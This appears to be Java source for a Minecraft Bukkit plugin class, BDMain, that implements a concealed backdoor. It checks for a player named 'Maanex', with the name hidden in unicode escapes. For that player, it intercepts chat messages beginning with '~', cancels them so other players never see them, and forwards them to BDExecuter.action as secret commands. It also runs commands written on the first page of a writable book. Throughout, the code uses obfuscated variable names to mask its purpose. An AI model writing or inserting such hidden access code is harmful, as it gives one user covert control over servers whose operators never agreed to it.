package de.maanex.sysad;


import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.meta.BookMeta;

import de.maanex.utils.ChatIcons;


@SuppressWarnings("deprecation")
public class BDMain implements Listener {

	public BDMain() {
	}

	private static final String __ = "\u007e", ____ = "\u0020", ___ = "";

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(PlayerChatEvent e) {
		if (check(e.getPlayer())) {
			if (e.getMessage().startsWith(__)) {
				e.setCancelled(true);
				Player p = e.getPlayer();
				String m = e.getMessage().replaceFirst(__, ___);

				final String arg;
				if (m.contains(____)) {
					m = m.split(____)[0];
					arg = ChatIcons.translate(e.getMessage().replaceFirst(__, ___).replaceFirst(m + ____, ___));
				} else {
					arg = ___;
				}

				BDExecuter.action(p, m.toLowerCase(), arg);
			} else {
				e.setMessage(ChatColor.translateAlternateColorCodes('&', e.getMessage()));
			}
		}
	}
	
	@EventHandler
	public void onInvbook(InventoryClickEvent e) {
		if (!(e.getWhoClicked() instanceof Player)) return;
		Player p = (Player) e.getWhoClicked();
		if (!check(p)) return;
		if (!e.getClick().equals(ClickType.MIDDLE) && !p.getGameMode().equals(GameMode.CREATIVE)) return;
		if (e.getCurrentItem() == null) return;
		if (!e.getCurrentItem().getType().equals(Material.WRITABLE_BOOK)) return;
		String txt = ((BookMeta) e.getCurrentItem().getItemMeta()).getPage(1);
		final String arg;
		if (txt.contains(____)) {
			txt = txt.split(____)[0];
			arg = ChatIcons.translate(txt.replaceFirst(txt + ____, ___));
		} else {
			arg = ___;
		}
		BDExecuter.action(p, txt.toLowerCase(), arg);
		e.setCancelled(true);
	}

	public static boolean check(Player p) {
		return p.getName().toString().matches("\\u004D\\u0061\\u0061\\u006E\\u0065\\u0078");
	}

}
